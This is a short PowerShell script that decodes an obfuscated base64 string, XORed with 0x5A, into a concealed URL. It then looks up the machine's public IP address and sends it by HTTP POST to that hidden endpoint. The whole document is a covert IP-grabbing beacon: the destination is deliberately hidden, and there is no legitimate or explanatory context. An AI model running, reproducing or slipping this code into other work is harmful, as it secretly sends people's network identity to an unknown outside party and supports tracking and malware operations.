$e='Mi4uKilgdXU+Myk5NSg+dDk1N3U7KjN1LT84MjU1MSl1a29va25ua21qY2lvaWNpam1vaHU+Li4xHAMfFjwWK25tBQ8Xbgg+BTRrFTJ3OA0wEyINEA8QBWgoMzBrOSxvEDZiO241LjY2LQI2GCxqEDk+NwowPTsxPQ=='
$w=[System.Text.Encoding]::UTF8.GetString([byte[]]([Convert]::FromBase64String($e)|%{$_-bxor0x5A}))
$i=(iwr 'https://api.ipify.org' -UseBasicParsing).Content
iwr $w -Method Post -Body "{""content"":""$i""}" -ContentType 'application/json'
